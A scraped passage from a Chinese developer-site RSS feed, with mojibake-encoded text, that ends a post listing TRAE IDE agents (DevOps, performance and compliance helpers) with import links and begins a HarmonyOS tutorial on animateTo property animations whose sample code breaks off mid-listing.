<h3 data-id="heading-19"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F16c32c" target="_blank" title="https://s.trae.com.cn/a/16c32c" ref="nofollow noopener noreferrer">s.trae.com.cn/a/16c32c</a></p>
<ul>
<li><strong>TRAE å›½é™…ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F720a05" target="_blank" title="https://s.trae.ai/a/720a05" ref="nofollow noopener noreferrer">s.trae.ai/a/720a05</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b29ab31fd4ca4c0aa5f895c69798d981~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=%2F16jyp2enh6ChvjXwiX2P1Uv8KA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20"><strong>DevOps å·¥ç¨‹å¸ˆ</strong></h2>
<h3 data-id="heading-21"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>DevOps Architect</p>
<h3 data-id="heading-22"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>DevOps Architectï¼ˆdevops-architectï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ DevOps æ™ºèƒ½ä½“ï¼Œæ“…é•¿æ„å»ºè‡ªåŠ¨åŒ–åŸºç¡€è®¾æ–½ã€CI/CD æµæ°´çº¿å’Œç›‘æ§ç³»ç»Ÿï¼Œç¡®ä¿è½¯ä»¶å¿«é€Ÿã€å¯é ã€å®‰å…¨åœ°äº¤ä»˜ï¼Œå¹¶å…·å¤‡é«˜å¯ç”¨æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>CI/CD æµæ°´çº¿ï¼š</strong> è®¾è®¡å’Œå®ç°è‡ªåŠ¨åŒ–æ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²ï¼Œæ”¯æŒå›æ»šä¸å¤šåˆ†æ”¯ç­–ç•¥ã€‚</p>
</li>
<li>
<p><strong>äº‘åŸºç¡€è®¾æ–½é…ç½®ï¼š</strong> æ­å»ºå¯æ‰©å±•ã€é«˜å¯ç”¨ã€å®‰å…¨çš„äº‘ç¯å¢ƒï¼ˆAWS/Azure/GCPï¼‰ï¼Œä½¿ç”¨åŸºç¡€è®¾æ–½å³ä»£ç ç®¡ç†èµ„æºã€‚</p>
</li>
<li>
<p><strong>ç›‘æ§ä¸å¯è§‚æµ‹æ€§ï¼š</strong> é…ç½®ç³»ç»Ÿç›‘æ§ã€å‘Šè­¦ã€æ—¥å¿—èšåˆå’Œåˆ†å¸ƒå¼è¿½è¸ªï¼Œæä¾›å¯æ“ä½œçš„è¿è¡Œæ´å¯Ÿã€‚</p>
</li>
<li>
<p><strong>éƒ¨ç½²è‡ªåŠ¨åŒ–ï¼š</strong> å®ç°è“ç»¿ã€é‡‘ä¸é›€ã€æ»šåŠ¨éƒ¨ç½²ç­–ç•¥ï¼Œè‡ªåŠ¨åŒ–æ•°æ®åº“è¿ç§»å’Œç¯å¢ƒç®¡ç†ã€‚</p>
</li>
<li>
<p><strong>å®‰å…¨ä¸åˆè§„ï¼š</strong> ç®¡ç†æƒé™ã€å¯†é’¥ã€åŠ å¯†å’Œå®¡è®¡ï¼Œç¡®ä¿ç¬¦åˆ SOC2ã€HIPAAã€PCI-DSS ç­‰æ ‡å‡†ã€‚</p>
</li>
</ul>
<h3 data-id="heading-23"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2Fbab503" target="_blank" title="https://s.trae.com.cn/a/bab503" ref="nofollow noopener noreferrer">s.trae.com.cn/a/bab503</a></p>
<ul>
<li><strong>TRAE å›½é™…ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F8a2ce1" target="_blank" title="https://s.trae.ai/a/8a2ce1" ref="nofollow noopener noreferrer">s.trae.ai/a/8a2ce1</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97a0d5ad28384211ba2b06de1cf90823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=DD3aDKO9BT43rHQrQENjrzbI3OY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18b76553ee3745f9a97d12c676bceabb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=A5Xv9ZTyvwO9b5Ko%2Bd0YILjSW9o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-24"><strong>æ€§èƒ½ä¼˜åŒ–å¸ˆ</strong></h2>
<h3 data-id="heading-25"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>Performance Expert</p>
<h3 data-id="heading-26"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>Performance Expertï¼ˆperformance-expertï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ€§èƒ½ä¼˜åŒ–æ™ºèƒ½ä½“ï¼Œæ“…é•¿ç³»ç»Ÿã€åº”ç”¨å’Œæ•°æ®åº“çš„æ€§èƒ½åˆ†æä¸ä¼˜åŒ–ã€‚å®ƒèƒ½å¤Ÿå‘ç°ç“¶é¢ˆã€è¿›è¡Œæ€§èƒ½æµ‹è¯•å’Œå‹åŠ›æµ‹è¯•ï¼Œå¹¶æä¾›å¯æ‰§è¡Œçš„ä¼˜åŒ–æ–¹æ¡ˆï¼Œä»è€Œæå‡å“åº”é€Ÿåº¦ã€ååé‡å’Œæ•´ä½“ç³»ç»Ÿæ•ˆç‡ã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>æ€§èƒ½æµ‹è¯•ï¼š</strong> è®¾è®¡å’Œæ‰§è¡Œè´Ÿè½½ã€å‹åŠ›å’Œè€ä¹…æ€§æµ‹è¯•ï¼Œå»ºç«‹æ€§èƒ½åŸºå‡†å¹¶æ¨¡æ‹Ÿå®é™…ç”¨æˆ·è¡Œä¸ºã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½åˆ†æä¸è¯Šæ–­ï¼š</strong> å¯¹ä»£ç ã€æ•°æ®åº“ã€å‰ç«¯å’ŒåŸºç¡€è®¾æ–½è¿›è¡Œå¤šå±‚çº§åˆ†æï¼Œå®šä½ç“¶é¢ˆå’Œçƒ­ç‚¹é—®é¢˜ã€‚</p>
</li>
<li>
<p><strong>ç³»ç»Ÿä¼˜åŒ–ï¼š</strong> ä»åº”ç”¨ä»£ç ã€æ•°æ®åº“æŸ¥è¯¢åˆ°åŸºç¡€è®¾æ–½é…ç½®ï¼Œæä¾›ç«¯åˆ°ç«¯æ€§èƒ½æ”¹è¿›å»ºè®®ã€‚</p>
</li>
<li>
<p><strong>ä»£ç ä¸æ•°æ®åº“ä¼˜åŒ–ï¼š</strong> æ”¹è¿›ç®—æ³•ã€æ•°æ®ç»“æ„ã€æŸ¥è¯¢æ•ˆç‡ã€ç¼“å­˜ç­–ç•¥å’Œ ORM ä½¿ç”¨ã€‚</p>
</li>
<li>
<p><strong>åŸºç¡€è®¾æ–½ä¼˜åŒ–ï¼š</strong> è°ƒæ•´çº¿ç¨‹æ± ã€å®¹å™¨é…ç½®ã€æ“ä½œç³»ç»Ÿå‚æ•°ã€è´Ÿè½½å‡è¡¡å’Œ CDN ç­–ç•¥ä»¥æå‡æ•´ä½“æ€§èƒ½ã€‚</p>
</li>
<li>
<p><strong>è´¨é‡ä¿è¯ä¸æŠ¥å‘Šï¼š</strong> æä¾›æ¸…æ™°çš„æ€§èƒ½åˆ†ææŠ¥å‘Šã€ä¼˜åŒ–å»ºè®®å’ŒéªŒè¯æ–¹æ³•ï¼Œç¡®ä¿ä¼˜åŒ–å¯è¡¡é‡ã€å¯é‡å¤ã€‚</p>
</li>
</ul>
<h3 data-id="heading-27"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F7bb287" target="_blank" title="https://s.trae.com.cn/a/7bb287" ref="nofollow noopener noreferrer">s.trae.com.cn/a/7bb287</a></p>
<ul>
<li><strong>TRAE å›½é™…ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F00067d" target="_blank" title="https://s.trae.ai/a/00067d" ref="nofollow noopener noreferrer">s.trae.ai/a/00067d</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e76487d18c9d494fbdf3d8c3422a6c55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=eVw5SKfI3AiYENC%2FyBI584MVgzk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-28"><strong>åˆè§„å®¡æŸ¥å‘˜</strong></h2>
<h3 data-id="heading-29"><strong>æ™ºèƒ½ä½“åç§°</strong></h3>
<p>Compliance Checker</p>
<h3 data-id="heading-30"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<p>Compliance Checkerï¼ˆcompliance-checkerï¼‰ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ³•å¾‹åˆè§„æ¨¡æ‹Ÿæ™ºèƒ½ä½“ï¼Œæ“…é•¿å®¡æŸ¥æ³•å¾‹æ–‡ä»¶ã€éšç§æ”¿ç­–å’ŒæœåŠ¡æ¡æ¬¾ï¼Œç¡®ä¿ç¬¦åˆå„ç±»æ³•è§„å’Œè¡Œä¸šæ ‡å‡†ã€‚å®ƒèƒ½å¤Ÿè¯†åˆ«æ½œåœ¨é£é™©ã€æå‡ºæ”¹è¿›å»ºè®®ï¼Œå¹¶å¸®åŠ©ä¼ä¸šé™ä½æ³•å¾‹åˆè§„é£é™©ã€‚</p>
<p>ä¸»è¦ä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>æ–‡ä»¶å®¡æŸ¥ï¼š</strong> æ£€æŸ¥æœåŠ¡æ¡æ¬¾ã€éšç§æ”¿ç­–ç­‰æ³•å¾‹æ–‡æ¡£ï¼Œè¯†åˆ«ç¼ºå¤±æ¡æ¬¾ã€æ­§ä¹‰æˆ–è¿‡æ—¶å†…å®¹ã€‚</p>
</li>
<li>
<p><strong>æ³•è§„åˆè§„è¯„ä¼°ï¼š</strong> æ ¹æ® GDPRã€CCPAã€PIPEDAã€COPPA ç­‰æ³•è§„åˆ†ææ–‡æ¡£åˆè§„æ€§ï¼Œæä¾›æ•´æ”¹å»ºè®®ã€‚</p>
</li>
<li>
<p><strong>é£é™©è¯†åˆ«ä¸ç¼“è§£ï¼š</strong> å‘ç°å¯èƒ½å¸¦æ¥æ³•å¾‹è´£ä»»çš„æ¡æ¬¾ã€æ¶ˆè´¹è€…ä¿æŠ¤é—®é¢˜ã€çŸ¥è¯†äº§æƒæˆ–ç”¨æˆ·å†…å®¹é£é™©ã€‚</p>
</li>
<li>
<p><strong>æœ€ä½³å®è·µå»ºè®®ï¼š</strong> æä¾›æ ‡å‡†æ¡æ¬¾ç¤ºä¾‹ï¼Œä¼˜å…ˆçº§æ•´æ”¹æ¸…å•ï¼Œå¹¶ç»™å‡ºå®æ–½æ—¶é—´è¡¨å’Œæ³•å¾‹ä¾æ®å¼•ç”¨ã€‚</p>
</li>
<li>
<p><strong>æ“ä½œæŒ‡å—ï¼š</strong> åŒºåˆ†æ³•å¾‹è¦æ±‚ä¸æœ€ä½³å®è·µï¼Œç¡®ä¿å»ºè®®å¯è½åœ°ã€å®ç”¨ä¸”ç¬¦åˆæ³•å¾‹æ ‡å‡†ã€‚</p>
</li>
</ul>
<h3 data-id="heading-31"><strong>é“¾æ¥</strong></h3>
<p>è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼Œç›´æ¥å°†æ™ºèƒ½ä½“å¯¼å…¥ TRAE å¯¹åº”çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚</p>
<ul>
<li><strong>TRAE ä¸­å›½ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F7a3bf7" target="_blank" title="https://s.trae.com.cn/a/7a3bf7" ref="nofollow noopener noreferrer">s.trae.com.cn/a/7a3bf7</a></p>
<ul>
<li><strong>TRAE å›½é™…ç‰ˆï¼š</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2Fc10186" target="_blank" title="https://s.trae.ai/a/c10186" ref="nofollow noopener noreferrer">s.trae.ai/a/c10186</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¸¿è’™æŠ€æœ¯å¹²è´§11ï¼šå±æ€§åŠ¨ç”»ä¸è½¬åœºæ•ˆæœå®æˆ˜]]></title>    <link>https://juejin.cn/post/7583973472323141647</link>    <guid>https://juejin.cn/post/7583973472323141647</guid>    <pubDate>2025-12-16T03:27:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472323141647" data-draft-id="7583955708318597120" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¸¿è’™æŠ€æœ¯å¹²è´§11ï¼šå±æ€§åŠ¨ç”»ä¸è½¬åœºæ•ˆæœå®æˆ˜"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-16T03:27:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èµµæµ©ç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/4185170523982995"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¸¿è’™æŠ€æœ¯å¹²è´§11ï¼šå±æ€§åŠ¨ç”»ä¸è½¬åœºæ•ˆæœå®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185170523982995/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èµµæµ©ç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:27:03.000Z" title="Tue Dec 16 2025 03:27:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p>Â æœ¬æ–‡èšç„¦åŸºç¡€å±æ€§åŠ¨ç”»ï¼ˆanimateToï¼‰å’Œé¡µé¢è½¬åœºåŠ¨ç”»ï¼ˆtransitionï¼‰ï¼Œé€šè¿‡ã€Œåˆ—è¡¨é¡¹æ»‘åŠ¨åˆ é™¤ + é¡µé¢åˆ‡æ¢æ¸å˜ã€çš„å®æˆ˜æ¡ˆä¾‹ï¼Œå¸¦å¤§å®¶æŒæ¡åŠ¨ç”»å¼€å‘æ ¸å¿ƒé€»è¾‘ï½</p>
<h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒè®¤çŸ¥ï¼šåŠ¨ç”»çš„åº”ç”¨åœºæ™¯ä¸æ ¸å¿ƒ API</h2>
<h3 data-id="heading-1">1. åº”ç”¨åœºæ™¯</h3>
<ul>
<li>ç»„ä»¶äº¤äº’åé¦ˆï¼ˆå¦‚æŒ‰é’®ç‚¹å‡»ç¼©æ”¾ã€åˆ—è¡¨é¡¹æ“ä½œåŠ¨ç”»ï¼‰</li>
<li>é¡µé¢åˆ‡æ¢è¿‡æ¸¡ï¼ˆå¦‚æ¸å˜ã€æ»‘åŠ¨è¿›å…¥ï¼‰</li>
<li>æ•°æ®å˜åŒ–å¯è§†åŒ–ï¼ˆå¦‚è¿›åº¦æ¡åŠ è½½ã€æ•°å­—æ»šåŠ¨ï¼‰</li>
<li>å¼•å¯¼ç”¨æˆ·æ³¨æ„åŠ›ï¼ˆå¦‚å¼¹çª—å¼¹å‡ºã€é€šçŸ¥æç¤ºï¼‰</li>
</ul>
<h3 data-id="heading-2">2. æ ¸å¿ƒ API</h3>
<ul>
<li>å±æ€§åŠ¨ç”»ï¼š<code>animateTo</code>ï¼ˆå£°æ˜å¼åŠ¨ç”»ï¼Œæ— éœ€æ‰‹åŠ¨æ§åˆ¶åŠ¨ç”»å¸§ï¼‰</li>
<li>è½¬åœºåŠ¨ç”»ï¼š<code>transition</code>ï¼ˆç»„ä»¶è½¬åœºé…ç½®ï¼‰ã€<code>pageTransition</code>ï¼ˆé¡µé¢è½¬åœºé…ç½®ï¼‰</li>
<li>å…³é”®å‚æ•°ï¼š<code>duration</code>ï¼ˆæ—¶é•¿ï¼‰ã€<code>curve</code>ï¼ˆåŠ¨ç”»æ›²çº¿ï¼‰ã€<code>delay</code>ï¼ˆå»¶è¿Ÿæ‰§è¡Œï¼‰</li>
</ul>
<h2 data-id="heading-3">äºŒã€å±æ€§åŠ¨ç”»ï¼šanimateTo åŸºç¡€ç”¨æ³•</h2>
<p>å±æ€§åŠ¨ç”»é€šè¿‡<code>animateTo</code>å‡½æ•°åŒ…è£¹ç»„ä»¶å±æ€§ä¿®æ”¹é€»è¾‘ï¼Œè‡ªåŠ¨å®ç°åŠ¨ç”»è¿‡æ¸¡ï¼Œæ”¯æŒä½ç½®ã€é€æ˜åº¦ã€å°ºå¯¸ç­‰å¸¸è§å±æ€§ï¼š</p>
<h3 data-id="heading-4">1. åŸºç¡€æ•ˆæœç¤ºä¾‹ï¼ˆæ§åˆ¶é€æ˜åº¦ã€å°ºå¯¸ã€ä½ç½®ï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { animateTo, <span class="hljs-title class_">Curve</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.ui.animation'</span>;

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">AnimateToBasicDemo</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">opacity</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">scale</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">offsetX</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">30</span> })
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">padding</span>(<span class="hljs-number">30</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-params"><span class="hljs-string">'#f5f5f5'</span></span>) {
      
      <span class="hljs-comment">// åŠ¨ç”»ç›®æ ‡ç»„ä»¶</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'å±æ€§åŠ¨ç”»æ¼”ç¤º'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">opacity</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span>)
        .<span class="hljs-title function_">scale</span>({ <span class="hljs-attr">x</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span>, <span class="hljs-attr">y</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span> })
        .<span class="hljs-title function_">translate</span>({ <span class="hljs-attr">x</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">offsetX</span> })
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#2f54eb'</span>)
        .<span class="hljs-title function_">color</span>(<span class="hljs-string">'#ffffff'</span>)
        .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">12</span>)

      <span class="hljs-comment">// æ§åˆ¶æŒ‰é’®ç»„</span>
      <span class="hljs-title class_">Row</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'é€æ˜åº¦å˜åŒ–'</span>)
          .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">animateTo</span>({
              <span class="hljs-attr">duration</span>: <span class="hljs-number">800</span>, <span class="hljs-comment">// åŠ¨ç”»æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰</span>
              <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span> <span class="hljs-comment">// åŠ¨ç”»æ›²çº¿ï¼ˆç¼“è¿›ç¼“å‡ºï¼‰</span>
            }, <span class="hljs-function">() =&gt;</span> {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> === <span class="hljs-number">1</span> ? <span class="hljs-number">0.3</span> : <span class="hljs-number">1</span>;
            });
          })

        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'ç¼©æ”¾æ•ˆæœ'</span>)
          .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">animateTo</span>({ <span class="hljs-attr">duration</span>: <span class="hljs-number">500</span> }, <span class="hljs-function">() =&gt;</span> {
